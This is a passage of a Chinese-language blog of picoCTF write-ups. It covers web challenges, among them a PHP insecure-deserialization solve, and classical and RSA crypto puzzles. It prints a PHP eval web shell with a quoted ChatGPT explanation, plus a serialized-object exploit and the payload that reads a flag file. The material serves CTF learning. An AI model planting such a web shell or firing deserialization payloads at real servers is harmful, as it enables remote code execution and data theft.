class="line">picoCTF&#123;c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b&#125;</span><br></pre></td></tr></table></figure><p>這邊補充一個知識點，來講一下<code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code>到底是在做啥。但因為我也不是很熟 php，所以我們來看看 ChatGPT 大神是怎麼回答的吧！</p><blockquote><p>當然，這段 PHP 代碼的原理是允許遠程執行伺服器上的 PHP 代碼。這是如何工作的：</p><ol><li><code>&lt;?php</code> 是 PHP 代碼的開始標記。</li><li><code>@eval($_POST[&#39;shell&#39;]);</code> 中的 <code>eval()</code> 函數執行傳遞給它的字符串作為 PHP 代碼。這裡的代碼來自於 HTTP POST 請求中名為 <code>shell</code> 的變量。</li><li><code>@</code> 符號用來抑制任何錯誤信息，這樣用戶不會看到執行過程中產生的任何錯誤。</li><li>由於這段代碼執行任意 PHP 代碼，它使得伺服器容易受到攻擊，因此屬於一種非常危險的做法。</li></ol><p>簡言之，任何通過 <code>shell</code> 變量傳送的代碼都將被伺服器執行，這可以用於各種目的，包括但不限於數據讀取、文件操作等。</p></blockquote><p>然後我後來找到了另一篇 writeup，它的 payload 比較酷，是一個即時執行的 input 框，有興趣可以去看一下<a href="https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18">這篇</a>。</p><h2 id="Super-Serial"><a href="#Super-Serial" class="headerlink" title="Super Serial"></a>Super Serial</h2><p>這題先讀取<code>/robots.txt</code>發現它有一個禁止的路徑為<code>/admin.phps</code>，這似乎代表著它有支持<code>.phps</code>文件。所以可以到<code>/index.phps</code>裡面看它的源代碼。（<code>phps</code>為 PHP source）</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704170553939.png" alt="index.phps"></p><p>題目說 Flag 在<code>../flag</code>中，所以解題的思路就是要想辦法讀取到<code>../flag</code>。先把圖片上的程式碼拿出來分析一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;cookie.php&quot;</span>;  <span class="comment"># 這裡用到了cookie.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$con</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&quot;../users.db&quot;</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user&quot;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>];</span><br><span class="line">    <span class="variable">$perm_res</span> = <span class="keyword">new</span> <span class="title function_ invoke__">permissions</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$perm_res</span>-&gt;<span class="title function_ invoke__">is_guest</span>() || <span class="variable">$perm_res</span>-&gt;<span class="title function_ invoke__">is_admin</span>()) &#123;</span><br><span class="line">        <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;login&quot;</span>, <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$perm_res</span>))), <span class="title function_ invoke__">time</span>() + <span class="number">86400</span> * <span class="number">30</span>, <span class="string">&quot;/&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: authentication.php&quot;</span>);  <span class="comment"># 這裡重定向到authentication.php</span></span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;&lt;h6 class=&quot;text-center&quot; style=&quot;color:red&quot;&gt;Invalid Login.&lt;/h6&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由於可以透過<code>.phps</code>查看原始代碼，所以先去查看<code>cookie.phps</code>和<code>authentication.phps</code>。可以發現在<code>cookie.php</code>中有以下漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;login&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$perm</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;login&quot;</span>])));</span><br><span class="line">        <span class="variable">$g</span> = <span class="variable">$perm</span>-&gt;<span class="title function_ invoke__">is_guest</span>();</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable">$perm</span>-&gt;<span class="title function_ invoke__">is_admin</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Deserialization error. &quot;</span> . <span class="variable">$perm</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這裡的反序列化是不安全的（題目名稱也有提示是和 Serial 有關），如果反序列化失敗，進入到 catch error 裡面，就會把<code>$perm</code>輸出。在<code>authentication.php</code>裡面的<code>access_log</code>這個類中，他定義了<code>__toString()</code>就是讀取並回傳<code>log_file</code>的內容。</p><p>所以我們只要建立一個<code>login</code>的 cookie，並輸入錯誤的值，就可以觸發反序列化的錯誤。下圖中我設置了<code>login</code>的值為<code>TEST</code>，成功觸發反序列化錯誤的訊息。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160307961.png" alt="Deserialization error"></p><p>接著我們用<a href="https://onlinephp.io/">PHP Sandbox</a>來線上寫一些 php 的程式碼。這邊會這樣寫是因為我們從<code>cookie.phps</code>中可以看到原始碼是先 URL decode 再 Base64 decode，最後才反序列化。所以整個流程就是反過來就對了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="string">&quot;TEST&quot;</span>))))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>他這邊輸出了<code>czo0OiJURVNUIjs%3D</code>，我們把 cookie 的值修改為這個試試看，能不能正確的輸出<code>TEST</code>。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706160839984.png" alt="PoC"></p><p>成功！再來我們只需要 new 一個 access_log 的 class，並且把他的<code>$log_file</code>設定為<code>&quot;../flag&quot;</code>就可以了！Exploit 如下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">access_log</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$log_file</span> = <span class="string">&quot;../flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title function_ invoke__">access_log</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>))))</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面這個代碼執行後會得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9</span><br></pre></td></tr></table></figure><p>這個就是我們最終的 Payload 啦，把它貼到<code>login</code>的 cookie 的 value，並重新整理頁面試試看吧。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706161944368.png" alt="Pwned!"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-Code-Analysis"><a href="#Java-Code-Analysis" class="headerlink" title="Java Code Analysis!?!"></a>Java Code Analysis!?!</h2><p>這題稍微大一點，是一個電子書系統。一開始他給了一個登入介面還有一組帳密：帳號<code>user</code>，密碼<code>user</code>。除此之外，也有給源代碼。我們先來看看網頁的樣子。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704143233744.png" alt="Login"></p><p>登入後會看到更多的功能，包括閱讀書籍、查詢書籍、查看帳戶等等。登入後的介面如下。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240704143405607.png" alt="Home page"></p><p>題目告訴我們，這題的 Winning condition 是要讀取到 Flag 的書籍，就可以獲得 Flag 了。但是向上圖所看到的，我們現在是 Free user，而 Flag 這本書只有 Admin 可以閱讀，所以要來想辦法提升權限。</p><p><strong>&#x2F;&#x2F; TODO</strong></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><ul><li><a href="https://github.com/CX330Blake/Crypto_Notebook">My scripts &amp; note on Github</a></li><li><a href="https://cx330.tw/StudyNotes/Cryptography-Notes-%E5%AF%86%E7%A2%BC%E5%AD%B8%E4%BB%BB%E7%9D%A3%E4%BA%8C%E8%84%88/">Cryptography Notebook 密碼學任督二脈</a></li></ul><h2 id="Easy1"><a href="#Easy1" class="headerlink" title="Easy1"></a>Easy1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">    A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line">   +----------------------------------------------------</span><br><span class="line">A | A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</span><br><span class="line">B | B C D E F G H I J K L M N O P Q R S T U V W X Y Z A</span><br><span class="line">C | C D E F G H I J K L M N O P Q R S T U V W X Y Z A B</span><br><span class="line">D | D E F G H I J K L M N O P Q R S T U V W X Y Z A B C</span><br><span class="line">E | E F G H I J K L M N O P Q R S T U V W X Y Z A B C D</span><br><span class="line">F | F G H I J K L M N O P Q R S T U V W X Y Z A B C D E</span><br><span class="line">G | G H I J K L M N O P Q R S T U V W X Y Z A B C D E F</span><br><span class="line">H | H I J K L M N O P Q R S T U V W X Y Z A B C D E F G</span><br><span class="line">I | I J K L M N O P Q R S T U V W X Y Z A B C D E F G H</span><br><span class="line">J | J K L M N O P Q R S T U V W X Y Z A B C D E F G H I</span><br><span class="line">K | K L M N O P Q R S T U V W X Y Z A B C D E F G H I J</span><br><span class="line">L | L M N O P Q R S T U V W X Y Z A B C D E F G H I J K</span><br><span class="line">M | M N O P Q R S T U V W X Y Z A B C D E F G H I J K L</span><br><span class="line">N | N O P Q R S T U V W X Y Z A B C D E F G H I J K L M</span><br><span class="line">O | O P Q R S T U V W X Y Z A B C D E F G H I J K L M N</span><br><span class="line">P | P Q R S T U V W X Y Z A B C D E F G H I J K L M N O</span><br><span class="line">Q | Q R S T U V W X Y Z A B C D E F G H I J K L M N O P</span><br><span class="line">R | R S T U V W X Y Z A B C D E F G H I J K L M N O P Q</span><br><span class="line">S | S T U V W X Y Z A B C D E F G H I J K L M N O P Q R</span><br><span class="line">T | T U V W X Y Z A B C D E F G H I J K L M N O P Q R S</span><br><span class="line">U | U V W X Y Z A B C D E F G H I J K L M N O P Q R S T</span><br><span class="line">V | V W X Y Z A B C D E F G H I J K L M N O P Q R S T U</span><br><span class="line">W | W X Y Z A B C D E F G H I J K L M N O P Q R S T U V</span><br><span class="line">X | X Y Z A B C D E F G H I J K L M N O P Q R S T U V W</span><br><span class="line">Y | Y Z A B C D E F G H I J K L M N O P Q R S T U V W X</span><br><span class="line">Z | Z A B C D E F G H I J K L M N O P Q R S T U V W X Y</span><br><span class="line"></span><br><span class="line">Cipher: UFJKXQZQUNB</span><br><span class="line">Key: SOLVECRYPTO</span><br></pre></td></tr></table></figure><p>這題是一個維吉尼亞密碼。維吉尼亞密碼（法語：Chiffre de Vigenère，又譯維熱納爾密碼）是使用一系列凱撒密碼組成密碼字母表的加密算法，屬於多表密碼的一種簡單形式。<a href="https://zh.wikipedia.org/zh-tw/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81">維基百科</a><br>解密的方式也很簡單，最上面一列是明文，最左邊那行是 KEY，這樣對應起來中間的字元就是密文。知道了這個之後回推回去就可以得到明文。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&quot;UFJKXQZQUNB&quot;</span></span><br><span class="line">key = <span class="string">&quot;SOLVECRYPTO&quot;</span></span><br><span class="line"></span><br><span class="line">pt = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">    shift = <span class="built_in">ord</span>(key[i]) - <span class="number">65</span>  <span class="comment"># 獲取密鑰字母的偏移量</span></span><br><span class="line">    c = <span class="built_in">ord</span>(cipher[i])  <span class="comment"># 獲取密文當中目前的字母</span></span><br><span class="line"></span><br><span class="line">    c = (c - shift - <span class="number">65</span>) % <span class="number">26</span> + <span class="number">65</span>  <span class="comment"># 用偏移量進行解密</span></span><br><span class="line">    pt += <span class="built_in">chr</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Message: <span class="subst">&#123;pt&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>而最後的 flag 如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;CRYPTOISFUN&#125;</span><br></pre></td></tr></table></figure><h2 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h2><p>如同題目所說，這題就是個基本的凱薩加密。題目給了加密過的 flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;gvswwmrkxlivyfmgsrhnrisegl&#125;</span><br></pre></td></tr></table></figure><p>就把裡面那串拿去解密，因為不知道偏移量是多少，所以就暴力破解。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&quot;gvswwmrkxlivyfmgsrhnrisegl&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_cipher</span>(<span class="params">text, shift</span>):</span><br><span class="line">    plaintext = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> text:</span><br><span class="line">        plaintext += <span class="built_in">chr</span>((<span class="built_in">ord</span>(c) - <span class="number">97</span> + shift) % <span class="number">26</span> + <span class="number">97</span>)</span><br><span class="line">    <span class="keyword">return</span> plaintext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    plaintext = caesar_cipher(cipher, i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Shift <span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;plaintext&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>跑出來的結果中，看起來是<code>crossingtherubicondjneoach</code>最合理，所以這就是 flag 了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;crossingtherubicondjneoach&#125;</span><br></pre></td></tr></table></figure><h2 id="New-Caesar"><a href="#New-Caesar" class="headerlink" title="New Caesar"></a>New Caesar</h2><p>題目給了一個密文和一個 Python 腳本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apbopjbobpnjpjnmnnnmnlnbamnpnononpnaaaamnlnkapndnkncamnpapncnbannaapncndnlnpna</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">LOWERCASE_OFFSET = <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">ALPHABET = string.ascii_lowercase[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b16_encode</span>(<span class="params">plain</span>):</span><br><span class="line">enc = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> plain:</span><br><span class="line">binary = <span class="string">&quot;&#123;0:08b&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(c))</span><br><span class="line">enc += ALPHABET[<span class="built_in">int</span>(binary[:<span class="number">4</span>], <span class="number">2</span>)]</span><br><span class="line">enc += ALPHABET[<span class="built_in">int</span>(binary[<span class="number">4</span>:], <span class="number">2</span>)]</span><br><span class="line"><span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">c, k</span>):</span><br><span class="line">t1 = <span class="built_in">ord</span>(c) - LOWERCASE_OFFSET</span><br><span class="line">t2 = <span class="built_in">ord</span>(k) - LOWERCASE_OFFSET</span><br><span class="line"><span class="keyword">return</span> ALPHABET[(t1 + t2) % <span class="built_in">len</span>(ALPHABET)]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;redacted&quot;</span></span><br><span class="line">key = <span class="string">&quot;redacted&quot;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([k <span class="keyword">in</span> ALPHABET <span class="keyword">for</span> k <span class="keyword">in</span> key])</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">b16 = b16_encode(flag)</span><br><span class="line">enc = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(b16):</span><br><span class="line">enc += shift(c, key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"><span class="built_in">print</span>(enc)</span><br></pre></td></tr></table></figure><p>先觀察這個加密腳本。發現他是把明文每個字母的 Ascii 值轉為 Binary 後，從左邊補 0 補到 8 個 Bits，然後每4位元分為一塊，每塊的二進制數字（0～15）映射到Base16的字符集（a～p）。再把這個東西拿去做shift，就是凱薩加密的變形。</p><p>總之解密的話就是反著來，就不詳細解釋了。Exploit如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">LOWERCASE_OFFSET = <span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">ALPHABET = string.ascii_lowercase[:<span class="number">16</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b16_encode</span>(<span class="params">plain</span>):</span><br><span class="line">    enc = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> plain:</span><br><span class="line">        binary = <span class="string">&quot;&#123;0:08b&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">ord</span>(c))</span><br><span class="line">        enc += ALPHABET[<span class="built_in">int</span>(binary[:<span class="number">4</span>], <span class="number">2</span>)]  <span class="comment"># Since 4 bits can represent 16 characters</span></span><br><span class="line">        enc += ALPHABET[<span class="built_in">int</span>(binary[<span class="number">4</span>:], <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b16_decode</span>(<span class="params">b16</span>):</span><br><span class="line">    dec = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b16), <span class="number">2</span>):</span><br><span class="line">        first = b16[c]</span><br><span class="line">        second = b16[c + <span class="number">1</span>]</span><br><span class="line">        first_index = ALPHABET.index(first)</span><br><span class="line">        second_index = ALPHABET.index(second)</span><br><span class="line">        binary = <span class="built_in">bin</span>(first_index)[<span class="number">2</span>:].zfill(<span class="number">4</span>) + <span class="built_in">bin</span>(second_index)[<span class="number">2</span>:].zfill(<span class="number">4</span>)</span><br><span class="line">        dec += <span class="built_in">chr</span>(<span class="built_in">int</span>(binary, <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> dec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">c, k</span>):</span><br><span class="line">    t1 = <span class="built_in">ord</span>(c) - LOWERCASE_OFFSET  <span class="comment"># (c - 97 + k - 97) % 16 = result</span></span><br><span class="line">    t2 = <span class="built_in">ord</span>(k) - LOWERCASE_OFFSET</span><br><span class="line">    <span class="keyword">return</span> ALPHABET[(t1 + t2) % <span class="built_in">len</span>(ALPHABET)]  <span class="comment"># two numbers sum modulo 16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse_shift</span>(<span class="params">c, k</span>):</span><br><span class="line">    t1 = <span class="built_in">ord</span>(c) - LOWERCASE_OFFSET</span><br><span class="line">    t2 = <span class="built_in">ord</span>(k) - LOWERCASE_OFFSET</span><br><span class="line">    <span class="keyword">return</span> ALPHABET[(t1 - t2) % <span class="built_in">len</span>(ALPHABET)]  <span class="comment"># two numbers difference modulo 16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;apbopjbobpnjpjnmnnnmnlnbamnpnononpnaaaamnlnkapndnkncamnpapncnbannaapncndnlnpna&quot;</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> ALPHABET:</span><br><span class="line">    dec = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(enc):</span><br><span class="line">        dec += inverse_shift(c, key[i % <span class="built_in">len</span>(key)])</span><br><span class="line">    b16_dec = b16_decode(dec)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Decrypted flag: <span class="subst">&#123;b16_dec&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>暴力破解後，看起來最像Flag的就是<code>et_tu?_23217b54456fb10e908b5e87c6e89156</code>這個了。最後自己幫它包上<code>picoCTF&#123;&#125;</code>提交，果然是正確的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;et_tu?_23217b54456fb10e908b5e87c6e89156&#125;</span><br></pre></td></tr></table></figure><h2 id="rotation"><a href="#rotation" class="headerlink" title="rotation"></a>rotation</h2><p>這題給了一個加密後的密文。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xqkwKBN&#123;z0bib1wv_l3kzgxb3l_949in1i1&#125;</span><br></pre></td></tr></table></figure><p>看起來就是Transposition Cipher，直接拿去網路上那種凱薩密碼暴力破解。這邊使用<a href="https://gchq.github.io/CyberChef/">CyberChef</a>。</p><p><img src="https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240706165309173.png" alt="Pwned!"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">picoCTF&#123;r0tat1on_d3crypt3d_949af1a1&#125;</span><br></pre></td></tr></table></figure><h2 id="Mind-your-Ps-and-Qs"><a href="#Mind-your-Ps-and-Qs" class="headerlink" title="Mind your Ps and Qs"></a>Mind your Ps and Qs</h2><p>這題是個 RSA 加密，先來複習一下 RSA 加密裡面的流程和參數。</p><ul><li>$\text{Find two prime numbers } p \text{ and } q$</li><li>$n &#x3D; p \times q$</li><li>$\phi(n) &#x3D; (p-1) \times (q-1)$</li><li>$e \text{ is the encryption exponent}$</li><li>$d &#x3D; e^{-1} \mod \phi(n)$</li><li>$c \text{ is the encrypted message}; \quad c &#x3D; m^e \mod n$</li><li>$m \text{ is the message}; \quad m &#x3D; c^d \mod n$</li><li>$\text{Public key} &#x3D; (e, n)$</li><li>$\text{Private key} &#x3D; (d, n)$</li></ul><p>複習完後，看一下題目的說明。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Description:</span><br><span class="line">In RSA, a small e value can be problematic, but what about N? Can you decrypt this?</span><br><span class="line">==============================</span><br><span class="line">Decrypt my super sick RSA:</span><br><span class="line">c: 421345306292040663864066688931456845278496274597031632020995583473619804626233684</span><br><span class="line">n: 631371953793368771804570727896887140714495090919073481680274581226742748040342637</span><br><span class="line">e: 